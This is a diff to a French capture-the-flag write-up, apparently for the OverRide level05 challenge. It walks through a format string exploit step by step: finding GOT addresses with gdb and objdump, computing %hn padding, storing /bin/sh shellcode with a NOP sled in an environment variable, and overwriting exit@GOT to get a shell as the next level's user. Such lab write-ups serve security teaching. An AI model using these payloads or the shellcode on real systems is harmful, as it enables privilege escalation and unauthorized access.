@@ -27,3 +27,80 @@ Avec le direct parameter access, on peut se rendre compte que le 10 e argument d
 level05@OverRide:~$ python -c 'print("AAAA | %10$x")' | ./level05 
 aaaa | 61616161
 ```
+
+On va chercher a rediriger print@GOT vers system()
+``` bash
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) set $HIGH=0xf7e6
+(gdb) set $LOW=0xaed0
+
+
+level05@OverRide:~$ objdump -R level05 
+
+level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+```
+
+SHELLCODE = [print@GOT] + [print@GOT + 2] + %<pad1>x + %10$hn + %<pad2>x + %11$hn
+``` bash
+(gdb) set $LOW=0xaed0
+(gdb) set $HIGH=0xf7e6
+(gdb) set $PAD1=$LOW-8
+(gdb) p $LOW
+$9 = 44752
+(gdb) p $PAD1
+$10 = 44744
+(gdb) set $PAD2=$HIGH-$LOW
+(gdb) p $PAD2
+$11 = 18710
+(gdb) 
+```
+SHELLCODE = [0x080497d4] + [0x080497d6] + %44744x + %10$hn + %18710x + %11$hn
+
+python -c 'print("\x08\x04\x97\xd4"[::-1] + "\x08\x04\x97\xd6"[::-1] + "%44744x%10$hn%18710x%11$hn")' 
+
+++++++++++++++++++++++++++++++++++++++++++++++++++
+on peux essayer avec un shellcode system(/bin/sh):
+Pour le shellcode:
+`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
+level05@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 50 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
+On trouve l'adresse de SHELLCODE avec un petit programme:
+:~$ cat /tmp/getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+  printf("%p\n", getenv("SHELLCODE"));
+}
+level05@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv
+level05@OverRide:~$ /tmp/getenv
+0xffffd827
+soit au milieu du NOP 0xffffd847
+
+PAYLOAD = [exit@GOT] + [exit@GOT + 2] + %<pad1>x + %10$hn + %<pad2>x + %11$hn
+avec 
+    low = 0xd847 = 55367
+    high = 0xffff = 65535
+    pad1 = low - 8 = 55359
+    pad2 = high - low = 10168
+    [exit@GOT]      -> %10$hn  (écrit 0xd847)
+    [exit@GOT + 2]  -> %11$hn  (écrit 0xffff)
+
+    exit@GOT = 0x080497e0
+    exit@GOT + 2 = 0x080497e2
+
+PAYLOAD = python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55359x%10$hn%10168x%11$hn" )'
+level05@OverRide:~$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55359x%10$hn%10168x%11$hn" )'; cat) | ./level05 
+f7fcfac0
+whoami
+level06
